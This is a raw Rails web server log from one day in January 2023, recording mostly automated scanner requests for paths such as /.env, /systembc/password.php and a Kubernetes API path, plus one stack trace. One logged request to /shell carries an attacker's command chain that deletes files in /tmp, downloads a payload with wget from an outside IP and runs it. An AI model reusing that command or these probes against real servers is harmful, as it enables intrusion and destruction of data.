I, [2023-01-22T06:46:14.307267 #1791623]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 06:46:14 +0900
I, [2023-01-22T06:46:14.308093 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T06:46:14.308148 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T06:46:14.308980 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T06:46:14.311648 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.0ms | Allocations: 299)
I, [2023-01-22T06:46:14.312903 #1791623]  INFO -- : Completed 200 OK in 5ms (Views: 3.4ms | Allocations: 521)
I, [2023-01-22T06:46:14.877549 #1791623]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 06:46:14 +0900
F, [2023-01-22T06:46:14.877869 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T07:13:47.056595 #1791621]  INFO -- : Started GET "/.env" for 104.210.221.165 at 2023-01-22 07:13:47 +0900
I, [2023-01-22T07:13:47.057251 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T07:13:47.057297 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T07:13:47.057719 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T07:13:47.058532 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T07:13:47.058713 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T07:13:47.314146 #1791621]  INFO -- : Started POST "/" for 104.210.221.165 at 2023-01-22 07:13:47 +0900
F, [2023-01-22T07:13:47.314494 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T07:31:46.807574 #1791621]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws" for 102.214.18.93 at 2023-01-22 07:31:46 +0900
I, [2023-01-22T07:31:46.808259 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T07:31:46.808309 #1791621]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 45.12.253.180/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-22T07:31:46.808732 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T07:31:46.809444 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T07:31:46.809628 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 514)
I, [2023-01-22T07:58:42.650398 #1791621]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 07:58:42 +0900
I, [2023-01-22T07:58:42.651007 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T07:58:42.651045 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T07:58:42.651878 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T07:58:42.653243 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-01-22T07:58:42.653433 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
I, [2023-01-22T07:58:43.205981 #1791623]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 07:58:43 +0900
F, [2023-01-22T07:58:43.206304 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T08:35:39.903077 #1791623]  INFO -- : Started GET "/" for 78.211.212.89 at 2023-01-22 08:35:39 +0900
I, [2023-01-22T08:35:39.903660 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T08:35:39.904083 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T08:35:39.904718 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T08:35:39.904906 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 513)
I, [2023-01-22T08:36:23.601857 #1791623]  INFO -- : Started GET "/" for 34.78.120.99 at 2023-01-22 08:36:23 +0900
I, [2023-01-22T08:36:23.602698 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T08:36:23.603220 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T08:36:23.604120 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-22T08:36:23.604302 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-01-22T08:50:38.130588 #1791623]  INFO -- : Started GET "/" for 167.94.145.60 at 2023-01-22 08:50:38 +0900
I, [2023-01-22T08:50:38.131166 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T08:50:38.131655 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T08:50:38.132498 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T08:50:38.133153 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 513)
I, [2023-01-22T08:50:38.591724 #1791621]  INFO -- : Started GET "/" for 167.94.145.60 at 2023-01-22 08:50:38 +0900
I, [2023-01-22T08:50:38.592534 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T08:50:38.593282 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T08:50:38.593912 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T08:50:38.594084 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T09:13:08.920118 #1791621]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-01-22 09:13:08 +0900
I, [2023-01-22T09:13:08.920733 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T09:13:08.920774 #1791621]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-01-22T09:13:08.921230 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T09:13:08.921863 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T09:13:08.922020 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-01-22T09:45:33.680212 #1791621]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-01-22 09:45:33 +0900
I, [2023-01-22T09:45:33.680865 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T09:45:33.680945 #1791621]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-01-22T09:45:33.681368 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T09:45:33.682204 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-01-22T09:45:33.682364 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-01-22T09:49:42.157533 #1791621]  INFO -- : Started GET "/druid/index.html" for 162.243.140.29 at 2023-01-22 09:49:42 +0900
I, [2023-01-22T09:49:42.158143 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T09:49:42.158182 #1791621]  INFO -- :   Parameters: {"all"=>"druid/index"}
I, [2023-01-22T09:49:42.158586 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T09:49:42.159206 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-01-22T09:49:42.159643 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 509)
I, [2023-01-22T10:36:54.205703 #1791621]  INFO -- : Started GET "/" for 198.235.24.9 at 2023-01-22 10:36:54 +0900
I, [2023-01-22T10:36:54.206290 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T10:36:54.207216 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T10:36:54.210224 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.3ms | Allocations: 298)
I, [2023-01-22T10:36:54.210432 #1791621]  INFO -- : Completed 200 OK in 4ms (Views: 3.9ms | Allocations: 512)
I, [2023-01-22T10:40:18.269799 #1791621]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 10:40:18 +0900
I, [2023-01-22T10:40:18.270516 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T10:40:18.270562 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T10:40:18.271065 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T10:40:18.273003 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.0ms | Allocations: 299)
I, [2023-01-22T10:40:18.273315 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.3ms | Allocations: 521)
I, [2023-01-22T10:40:18.815204 #1791623]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 10:40:18 +0900
F, [2023-01-22T10:40:18.815529 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T11:15:49.780505 #1791623]  INFO -- : Started GET "/" for 34.78.6.216 at 2023-01-22 11:15:49 +0900
I, [2023-01-22T11:15:49.781188 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T11:15:49.781642 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T11:15:49.782276 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T11:15:49.785043 #1791623]  INFO -- : Completed 200 OK in 4ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T11:27:43.622111 #1791623]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 11:27:43 +0900
I, [2023-01-22T11:27:43.622863 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T11:27:43.622912 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T11:27:43.623347 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T11:27:43.624058 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T11:27:43.624236 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T11:27:44.174075 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 11:27:44 +0900
F, [2023-01-22T11:27:44.174450 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T12:03:51.354810 #1791621]  INFO -- : Started GET "/apis/apps/v1/namespaces/kube-system/daemonsets" for 45.134.140.168 at 2023-01-22 12:03:51 +0900
I, [2023-01-22T12:03:51.355920 #1791621]  INFO -- : Processing by UserController#index as JSON
I, [2023-01-22T12:03:51.355974 #1791621]  INFO -- :   Parameters: {"all"=>"apis/apps/v1/namespaces/kube-system/daemonsets"}
I, [2023-01-22T12:03:51.356863 #1791621]  INFO -- : Completed 406 Not Acceptable in 1ms (Allocations: 186)
F, [2023-01-22T12:03:51.357540 #1791621] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/json"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-01-22T12:42:35.672698 #1791621]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 12:42:35 +0900
I, [2023-01-22T12:42:35.673320 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T12:42:35.673374 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T12:42:35.673974 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T12:42:35.674969 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-22T12:42:35.675585 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-01-22T12:42:36.231028 #1791623]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 12:42:36 +0900
F, [2023-01-22T12:42:36.231353 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T13:05:00.889738 #1791623]  INFO -- : Started GET "/" for 205.210.31.150 at 2023-01-22 13:05:00 +0900
I, [2023-01-22T13:05:00.890339 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:05:00.890784 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:05:00.891615 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T13:05:00.891801 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T13:07:18.829479 #1791623]  INFO -- : Started GET "/.env" for 109.237.97.180 at 2023-01-22 13:07:18 +0900
I, [2023-01-22T13:07:18.830076 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:07:18.830116 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T13:07:18.830795 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:07:18.831570 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T13:07:18.831751 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T13:17:45.612041 #1791623]  INFO -- : Started GET "/" for 128.14.141.34 at 2023-01-22 13:17:45 +0900
I, [2023-01-22T13:17:45.612753 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:17:45.613372 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:17:45.614192 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T13:17:45.614389 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T13:20:20.792299 #1791623]  INFO -- : Started GET "/" for 88.227.143.25 at 2023-01-22 13:20:20 +0900
I, [2023-01-22T13:20:20.793082 #1791623]  INFO -- : Processing by UserController#index as TEXT
I, [2023-01-22T13:20:20.793702 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:20:20.794473 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T13:20:20.794651 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 519)
I, [2023-01-22T13:21:49.156510 #1791623]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-22 13:21:49 +0900
I, [2023-01-22T13:21:49.157137 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:21:49.157184 #1791623]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-22T13:21:49.157603 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:21:49.158912 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-01-22T13:21:49.159077 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 505)
I, [2023-01-22T13:54:40.450808 #1791623]  INFO -- : Started HEAD "/" for 129.146.61.255 at 2023-01-22 13:54:40 +0900
I, [2023-01-22T13:54:40.451434 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:54:40.451876 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:54:40.452493 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T13:54:40.452670 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 512)
I, [2023-01-22T13:54:40.754840 #1791621]  INFO -- : Started GET "/.env" for 129.146.61.255 at 2023-01-22 13:54:40 +0900
I, [2023-01-22T13:54:40.755606 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T13:54:40.755653 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T13:54:40.756118 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:54:40.756848 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T13:54:40.757074 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T13:54:41.008145 #1791621]  INFO -- : Started POST "/" for 129.146.61.255 at 2023-01-22 13:54:41 +0900
F, [2023-01-22T13:54:41.010048 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T13:55:10.154720 #1791623]  INFO -- : Started GET "/" for 79.129.169.45 at 2023-01-22 13:55:10 +0900
I, [2023-01-22T13:55:10.155412 #1791623]  INFO -- : Processing by UserController#index as TEXT
I, [2023-01-22T13:55:10.155844 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T13:55:10.156460 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T13:55:10.156637 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 519)
I, [2023-01-22T14:24:17.780375 #1791623]  INFO -- : Started GET "/" for 162.243.140.39 at 2023-01-22 14:24:17 +0900
I, [2023-01-22T14:24:17.780991 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T14:24:17.781518 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T14:24:17.782198 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T14:24:17.782376 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T14:54:18.709930 #1791623]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 14:54:18 +0900
I, [2023-01-22T14:54:18.710692 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T14:54:18.710738 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T14:54:18.711243 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T14:54:18.712242 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-01-22T14:54:18.712424 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-01-22T14:54:19.271549 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 14:54:19 +0900
F, [2023-01-22T14:54:19.271889 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T14:59:55.878071 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 14:59:55 +0900
I, [2023-01-22T14:59:55.878960 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T14:59:55.879008 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T14:59:55.879494 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T14:59:55.880122 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T14:59:55.881559 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 2.2ms | Allocations: 521)
I, [2023-01-22T14:59:57.788717 #1791623]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 14:59:57 +0900
F, [2023-01-22T14:59:57.789171 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T15:21:16.393645 #1791623]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 15:21:16 +0900
F, [2023-01-22T15:21:16.393982 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T15:21:16.934395 #1791623]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 15:21:16 +0900
I, [2023-01-22T15:21:16.935285 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T15:21:16.935343 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T15:21:16.935797 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T15:21:16.936526 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T15:21:16.936708 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T16:34:39.605451 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 16:34:39 +0900
I, [2023-01-22T16:34:39.606047 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T16:34:39.606087 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T16:34:39.606498 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T16:34:39.607160 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T16:34:39.607335 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T16:34:40.174298 #1791623]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 16:34:40 +0900
F, [2023-01-22T16:34:40.174633 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T17:33:09.828849 #1791623]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 17:33:09 +0900
F, [2023-01-22T17:33:09.829217 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T17:33:10.371085 #1791623]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 17:33:10 +0900
I, [2023-01-22T17:33:10.372013 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T17:33:10.372066 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T17:33:10.372701 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T17:33:10.373673 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-22T17:33:10.374518 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 521)
I, [2023-01-22T17:50:40.909295 #1791621]  INFO -- : Started GET "/" for 34.76.96.55 at 2023-01-22 17:50:40 +0900
I, [2023-01-22T17:50:40.909894 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T17:50:40.910322 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
